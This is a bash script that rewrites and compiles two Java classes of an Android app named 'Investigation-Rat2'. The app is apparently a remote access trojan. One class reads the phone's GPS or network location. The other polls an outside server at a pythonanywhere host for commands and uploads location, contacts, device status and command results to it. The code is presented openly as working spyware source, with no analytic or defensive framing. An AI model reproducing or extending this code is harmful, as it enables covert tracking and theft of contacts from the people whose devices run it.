#!/bin/bash

echo "🔧 FIXING COMPILATION ERRORS ONLY..."

cd ~/Investigation-Rat2

# ==================== FIX RealLocationCollector JSON ERRORS ====================
echo "📍 Fixing RealLocationCollector JSON exceptions..."

cat > app/src/main/java/com/spyrat/investigation/RealLocationCollector.java << 'LOCATIONFIX'
package com.spyrat.investigation;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
import android.util.Log;
import org.json.JSONObject;

public class RealLocationCollector {
    private static final String TAG = "RealLocationCollector";
    private Context context;
    
    public RealLocationCollector(Context context) {
        this.context = context;
    }
    
    public JSONObject getCurrentLocation() {
        JSONObject locationInfo = new JSONObject();
        
        try {
            Log.d(TAG, "📍 Collecting real location...");
            
            LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            
            // Try GPS first
            Location location = null;
            if (locationManager != null) {
                if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                    location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                }
                
                // If GPS not available, try network
                if (location == null && locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
                    location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                }
            }
            
            if (location != null) {
                locationInfo.put("latitude", location.getLatitude());
                locationInfo.put("longitude", location.getLongitude());
                locationInfo.put("accuracy", location.getAccuracy());
                locationInfo.put("provider", location.getProvider());
                locationInfo.put("timestamp", location.getTime());
                locationInfo.put("altitude", location.hasAltitude() ? location.getAltitude() : 0);
                locationInfo.put("speed", location.hasSpeed() ? location.getSpeed() : 0);
                
                Log.d(TAG, "📍 Real Location: " + location.getLatitude() + ", " + location.getLongitude());
            } else {
                // Return empty location data instead of fake data
                locationInfo.put("latitude", JSONObject.NULL);
                locationInfo.put("longitude", JSONObject.NULL);
                locationInfo.put("accuracy", JSONObject.NULL);
                locationInfo.put("provider", "no_location_available");
                locationInfo.put("timestamp", System.currentTimeMillis());
                locationInfo.put("note", "No location data available - GPS and network not accessible");
                
                Log.d(TAG, "📍 No location data available");
            }
            
        } catch (SecurityException e) {
            Log.e(TAG, "❌ Location permission denied: " + e.getMessage());
            try {
                locationInfo.put("error", "Location permission denied");
            } catch (Exception jsonE) {
                Log.e(TAG, "❌ JSON error: " + jsonE.getMessage());
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Error getting location: " + e.getMessage());
            try {
                locationInfo.put("error", e.getMessage());
            } catch (Exception jsonE) {
                Log.e(TAG, "❌ JSON error: " + jsonE.getMessage());
            }
        }
        
        return locationInfo;
    }
}
LOCATIONFIX

# ==================== FIX InvestigatorApiClient MISSING METHODS ====================
echo "🔗 Fixing InvestigatorApiClient missing methods..."

cat > app/src/main/java/com/spyrat/investigation/InvestigatorApiClient.java << 'APIFIX'
package com.spyrat.investigation;

import android.content.Context;
import android.util.Log;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class InvestigatorApiClient {
    private static final String TAG = "InvestigatorApiClient";
    private static final String BASE_URL = "https://GhostTester.pythonanywhere.com";
    private Context context;
    private String investigatorCode;
    private String deviceId;
    private ExecutorService executor;
    
    public InvestigatorApiClient(Context context, String investigatorCode, String deviceId) {
        this.context = context;
        this.investigatorCode = investigatorCode;
        this.deviceId = deviceId;
        this.executor = Executors.newFixedThreadPool(3);
        Log.d(TAG, "🔧 API Client Created - Code: " + investigatorCode + ", Device: " + deviceId);
    }
    
    // ==================== VERIFY INVESTIGATOR CODE ====================
    public boolean verifyInvestigatorCode() {
        try {
            Log.d(TAG, "🔍 Verifying investigator code: " + investigatorCode);
            
            JSONObject requestBody = new JSONObject();
            requestBody.put("investigator_code", investigatorCode);
            
            JSONObject response = makeApiCall("/api/investigator/verify-code", "POST", requestBody);
            
            if (response != null && response.getBoolean("valid")) {
                String investigatorName = response.getString("investigator_name");
                Log.d(TAG, "✅ Investigator code verified: " + investigatorName);
                return true;
            } else {
                Log.e(TAG, "❌ Invalid investigator code");
                return false;
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Verification error: " + e.getMessage());
            return false;
        }
    }
    
    // ==================== CHECK FOR PENDING COMMANDS ====================
    public JSONArray getPendingCommands() {
        try {
            String url = BASE_URL + "/api/investigator/commands?device_id=" + deviceId + 
                        "&investigator_code=" + investigatorCode;
            
            Log.d(TAG, "📡 Fetching commands from: " + url);
            
            JSONObject response = makeApiCall(url, "GET", null);
            
            if (response != null && response.has("commands")) {
                JSONArray commands = response.getJSONArray("commands");
                Log.d(TAG, "📥 Received " + commands.length() + " commands");
                return commands;
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Get commands error: " + e.getMessage());
        }
        return new JSONArray();
    }
    
    // ==================== SEND DATA TO INVESTIGATOR ====================
    public void sendDataToInvestigator(String dataType, JSONObject dataContent) {
        executor.execute(() -> {
            try {
                Log.d(TAG, "📤 Sending data to investigator: " + dataType);
                
                JSONObject requestBody = new JSONObject();
                requestBody.put("device_id", deviceId);
                requestBody.put("investigator_code", investigatorCode);
                requestBody.put("data_type", dataType);
                requestBody.put("data_content", dataContent);
                
                JSONObject response = makeApiCall("/api/investigator/data", "POST", requestBody);
                
                if (response != null && "success".equals(response.optString("status"))) {
                    Log.d(TAG, "✅ Data sent successfully: " + dataType);
                } else {
                    Log.e(TAG, "❌ Failed to send data: " + dataType);
                }
            } catch (Exception e) {
                Log.e(TAG, "❌ Send data error: " + e.getMessage());
            }
        });
    }
    
    // ==================== SEND COMMAND RESPONSE ====================
    public void sendCommandResponse(String commandId, String status, String message) {
        try {
            JSONObject responseData = new JSONObject();
            responseData.put("command_id", commandId);
            responseData.put("status", status);
            responseData.put("message", message);
            responseData.put("device_id", deviceId);
            responseData.put("investigator_code", investigatorCode);
            responseData.put("timestamp", System.currentTimeMillis());
            
            sendDataToInvestigator("command_response", responseData);
            Log.d(TAG, "✅ Command response sent: " + commandId + " - " + status);
        } catch (Exception e) {
            Log.e(TAG, "❌ Send command response error: " + e.getMessage());
        }
    }
    
    // ==================== UPDATE DEVICE STATUS ====================
    public void updateDeviceStatus(String status, JSONObject deviceInfo) {
        try {
            JSONObject statusData = new JSONObject();
            statusData.put("status", status);
            statusData.put("device_info", deviceInfo);
            statusData.put("device_id", deviceId);
            statusData.put("investigator_code", investigatorCode);
            statusData.put("timestamp", System.currentTimeMillis());
            
            sendDataToInvestigator("device_status", statusData);
            Log.d(TAG, "✅ Device status updated: " + status);
        } catch (Exception e) {
            Log.e(TAG, "❌ Update device status error: " + e.getMessage());
        }
    }
    
    // ==================== SEND LOCATION DATA ====================
    public void sendLocationData(JSONObject locationInfo) {
        try {
            JSONObject locationData = new JSONObject();
            locationData.put("location", locationInfo);
            locationData.put("device_id", deviceId);
            locationData.put("investigator_code", investigatorCode);
            locationData.put("timestamp", System.currentTimeMillis());
            
            sendDataToInvestigator("location_data", locationData);
            Log.d(TAG, "✅ Location data sent");
        } catch (Exception e) {
            Log.e(TAG, "❌ Send location data error: " + e.getMessage());
        }
    }
    
    // ==================== SEND CONTACTS DATA ====================
    public void sendContactsData(JSONArray contacts) {
        try {
            JSONObject contactsData = new JSONObject();
            contactsData.put("contacts", contacts);
            contactsData.put("count", contacts.length());
            contactsData.put("device_id", deviceId);
            contactsData.put("investigator_code", investigatorCode);
            contactsData.put("timestamp", System.currentTimeMillis());
            
            sendDataToInvestigator("contacts_data", contactsData);
            Log.d(TAG, "✅ Contacts data sent: " + contacts.length() + " contacts");
        } catch (Exception e) {
            Log.e(TAG, "❌ Send contacts data error: " + e.getMessage());
        }
    }
    
    // ==================== UTILITY METHODS ====================
    private JSONObject makeApiCall(String endpoint, String method, JSONObject requestBody) {
        HttpURLConnection connection = null;
        try {
            URL url;
            if (endpoint.startsWith("http")) {
                url = new URL(endpoint);
            } else {
                url = new URL(BASE_URL + endpoint);
            }
            
            connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod(method);
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("User-Agent", "Investigation-RAT/1.0");
            connection.setConnectTimeout(30000);
            connection.setReadTimeout(30000);
            
            if (requestBody != null && "POST".equals(method)) {
                connection.setDoOutput(true);
                try (OutputStream os = connection.getOutputStream()) {
                    byte[] input = requestBody.toString().getBytes("utf-8");
                    os.write(input, 0, input.length);
                }
            }
            
            int responseCode = connection.getResponseCode();
            if (responseCode == HttpURLConnection.HTTP_OK) {
                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String inputLine;
                StringBuilder response = new StringBuilder();
                
                while ((inputLine = in.readLine()) != null) {
                    response.append(inputLine);
                }
                in.close();
                
                return new JSONObject(response.toString());
            } else {
                Log.e(TAG, "❌ API call failed: " + responseCode);
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ API call error: " + e.getMessage());
        } finally {
            if (connection != null) {
                connection.disconnect();
            }
        }
        return null;
    }
    
    public void cleanup() {
        try {
            if (executor != null) {
                executor.shutdown();
            }
            Log.d(TAG, "🧹 InvestigatorApiClient cleaned up");
        } catch (Exception e) {
            Log.e(TAG, "❌ Cleanup error: " + e.getMessage());
        }
    }
}
APIFIX

echo "✅ COMPILATION ERRORS FIXED!"
echo "🔧 Changes made:"
echo "   - Fixed JSON exceptions in RealLocationCollector"
echo "   - Added missing sendLocationData() method"
echo "   - Added missing sendContactsData() method"
echo "   - Removed fake location data - now returns NULL when no location available"

# Test compilation
echo "🚀 Testing compilation..."
./gradlew compileDebugJavaWithJavac

if [ $? -eq 0 ]; then
    echo "🎉 COMPILATION SUCCESSFUL!"
    echo "📦 Ready to push to GitHub"
else
    echo "❌ Compilation still has errors"
    echo "💡 Check the output above for details"
fi
